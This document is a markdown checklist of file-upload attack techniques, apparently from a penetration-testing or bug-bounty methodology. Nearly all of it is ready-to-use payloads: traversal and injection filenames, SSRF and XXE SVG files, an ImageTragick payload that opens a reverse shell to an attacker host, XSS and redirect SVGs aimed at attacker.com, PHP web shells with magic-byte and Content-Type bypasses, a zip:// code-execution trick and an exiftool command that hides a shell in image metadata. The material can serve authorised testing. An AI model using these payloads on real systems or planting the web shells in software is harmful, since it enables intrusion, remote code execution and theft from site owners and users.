- Vulnerabilities
    - [ ] Directory Traversal
        - Set filename `../../etc/passwd/logo.png`
        - Set filename `../../../logo.png` as it might change the website logo.
    - [ ] SQL Injection
        - Set filename `'sleep(10).jpg`.
        - Set filename `sleep(10)-- -.jpg`.
    - [ ] Command Injection
        - Set filename `; sleep 10;`
    - [ ] SSRF
        - Abusing the "Upload from URL"
        - SSRF Through `.svg` file

        ```php
        <?xml version="1.0" encoding="UTF-8" standalone="no"?>
        <svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
            <image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" />
        </svg>
        ```

    - [ ] ImageTragic

        ```
        push graphic-context
        viewbox 0 0 640 480
        fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
        pop graphic-context
        ```

    - [ ] XXE
        - Upload using `.svg` file

        ```xml
        <?xml version="1.0" standalone="yes"?>
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
        <svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
           <text font-size="40" x="0" y="16">&xxe;</text>
        </svg>
        ```

        ```xml
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
            <image xlink:href="expect://ls"></image>
        </svg>
        ```

        - Using excel file
    - [ ] XSS
        - Set file name `filename="svg onload=alert(document.domain)>"`, `filename="58832_300x300.jpg<svg onload=confirm()>"`
        - Upload using `.gif` file

        ```
        GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
        ```

        - Upload using `.svg` file

        ```xml
        <svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
        ```

        ```xml
        <?xml version="1.0" standalone="no"?>
        <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

        <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
           <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
           <script type="text/javascript">
              alert("HolyBugx XSS");
           </script>
        </svg>
        ```

    - [ ] Open Redirect
        1. Upload using `.svg` file

        ```xml
        <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
        <svg onload="window.location='https://attacker.com'" xmlns="http://www.w3.org/2000/svg">
            <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
        </svg>
        ```

- Content-ish Bypass
    - [ ] Content-type validation
        - Upload `file.php` and change the `Content-type: application/x-php` or `Content-Type : application/octet-stream` to `Content-type: image/png` or `Content-type: image/gif` or `Content-type: image/jpg`.
    - [ ] Content-Length validation
        - Small PHP Shell

        ```php
        (<?=`$_GET[x]`?>)
        ```

    - [ ] Content Bypass Shell
        - If they check the Content. Add the text "GIF89a;" before you shell-code. (`Content-type: image/gif`)

        ```php
        GIF89a; <?php system($_GET['cmd']); ?>
        ```

- Misc
    - [ ] Uploading `file.js` & `file.config` (web.config)
    - [ ] Pixel flood attack using image
    - [ ] DoS with a large values name: `1234...99.png`
    - [ ] Zip Slip
        - If a site accepts `.zip` file, upload `.php` and compress it into `.zip` and upload it. Now visit, `site.com/path?page=zip://path/file.zip%23rce.php`
    - [ ] Image Shell
        - Exiftool is a great tool to view and manipulate exif-data. Then rename the file `mv pic.jpg pic.php.jpg`

        ```php
        exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
        ```
